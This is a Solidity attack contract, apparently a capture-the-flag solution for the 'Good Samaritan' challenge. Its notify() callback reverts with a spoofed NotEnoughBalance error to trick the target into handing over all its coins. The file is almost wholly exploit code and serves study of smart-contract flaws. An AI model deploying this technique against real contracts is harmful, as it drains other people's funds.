// SPDX-License-Identifier: MIT
pragma solidity^0.8.2;

interface IGoodSamaritan{
    function requestDonation()external returns(bool);
}
contract Attack{
    error NotEnoughBalance();

    //solve this callenge by calling function attack()
    function attack(IGoodSamaritan samaritan)external{
        /*calling requestDonation() function
        
            because the caller will be this contract, contract Coin will call function
            notify() from this contract 
        
            if(dest_.isContract()) {
                 notify contract 
                INotifyable(dest_).notify(amount_);
                }
            */
        samaritan.requestDonation();
    }

    //notify() will be called by contract Coin
    function notify(uint amount)external{
        if(amount==10){
            //reverting costume error NotEnoughBalance()
            //so we get all the coins that GoodSamaritan has 
            revert NotEnoughBalance();
        }
             
    }
}